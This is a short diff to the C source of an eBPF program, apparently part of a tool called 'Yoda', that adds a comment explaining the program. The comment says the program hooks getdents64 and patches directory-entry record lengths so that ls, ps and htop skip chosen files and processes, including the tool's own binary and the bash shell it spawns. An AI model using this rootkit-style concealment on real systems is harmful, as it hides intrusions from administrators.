@@ -1,5 +1,22 @@
-// Inspired by https://github.com/Acceis/eBPF-hide-PID — thanks <3
 //go:build ignore
+
+/* Inspired by https://github.com/Acceis/eBPF-hide-PID — thanks <3
+
+   The goal of this eBPF program is to hide specific processes, files, or directories
+   by hooking the getdents64 syscall, which is used to list directory entries in Linux.
+   When a process calls getdents64 (for example, using ls, ps, lsof, or any file 
+   listing command), this program intercepts the syscall and scans the returned directory 
+   entries.
+   To hide an entry, we use a classic trick: we patch the reclen (record length) field of the 
+   previous directory entry so that it skips over the entry we want to hide. By adjusting 
+   the reclen value, the hidden entry is effectively 'removed' from the buffer returned 
+   to user space. As a result, standard tools like ls, htop or ps will not display the hidden files, 
+   directories, or processes.
+   Yoda automatically hides his own process, as well as his own binary file and the bash process
+   it spawns using shell feature.
+   You can also define your own files / directory prefix in configuration file config.go
+*/
+
 #include "vmlinux.h"
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
